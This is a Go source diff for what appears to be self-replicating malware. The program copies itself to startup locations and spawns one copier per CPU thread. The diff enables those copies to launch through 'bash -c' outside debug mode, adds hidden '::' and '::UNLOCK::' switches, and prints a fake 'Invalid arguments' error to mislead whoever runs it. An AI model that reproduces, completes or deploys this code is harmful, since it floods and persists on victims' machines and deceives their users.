@@ -9,18 +9,23 @@ import (
 	"os/user"
 	"path"
 	"runtime"
+	"slices"
 	"strings"
 	"time"
 )
 
 var __DEBUG_str string = "true"
 var DEBUG bool
+var forcedDebug bool
 var isWindows bool
 
 // ? Assigns DEBUG based on the value of __DEBUG_str
 func checkDebug() {
-	fmt.Println(__DEBUG_str)
-	DEBUG = __DEBUG_str == "true"
+	isWindows = runtime.GOOS == "windows"
+
+	forcedDebug = slices.Contains(os.Args, "::")
+	DEBUG = __DEBUG_str == "true" || forcedDebug
+	verbose("dbug", __DEBUG_str)
 }
 
 // ? Prints text to the console if DEBUG == true
@@ -167,9 +172,9 @@ func whileCopyL(sourceFile string, targetDir string) {
 
 		copy(sourceFile, tmpName)
 
-		// if !DEBUG {
-		go startProcL(tmpName)
-		// }
+		if !DEBUG {
+			go startProcL(fmt.Sprintf("bash -c %s &", tmpName))
+		}
 	}
 }
 
@@ -178,26 +183,27 @@ func main() {
 	// Initialize DEBUG
 	checkDebug()
 
-	isWindows = runtime.GOOS == "windows"
-
 	var this string
 	var startup string
 
 	// Get paths
 	if isWindows {
 		this, startup = startWindows()
-	} else { // Otherwise, assume it's Linux
+	} else { // Otherwise, assume it's Linux (Might work on Mac)
 		this, startup = startLinux()
 	}
 
-	//os.Exit(1)
+	// Don't fork
+	if forcedDebug {
+		os.Exit(0)
+	}
 
 	// Get the number of threads the CPU supports
 	threads := runtime.NumCPU()
 
 	verbose("bgn", "Starting...")
 	for i := 0; i < threads; i++ {
-		verbose("gort", "Start ", i)
+		verbose("gort", "Start ", i+1)
 
 		// Start copying on a new goroutine
 		if isWindows {
@@ -210,15 +216,16 @@ func main() {
 	// Wait 10 milliseconds to make sure at least one instance gets started
 	time.Sleep(time.Millisecond * 10)
 
-	// if len(os.Args) != 0 && os.Args[0] == "::UNLOCK::" {
-	// Prevent app exit
-	for {
-		time.Sleep(time.Hour)
+	if len(os.Args) != 0 && os.Args[0] == "::UNLOCK::" {
+		// Prevent app exit
+		for {
+			time.Sleep(time.Hour)
+		}
 	}
-	// }
 
 	// Fake an error
-	fmt.Println("Invalid arguments:", os.Args)
+	fmt.Println("Invalid arguments:", os.Args[1:])
+	os.Exit(1)
 }
 
 // ? Get application data for Linux
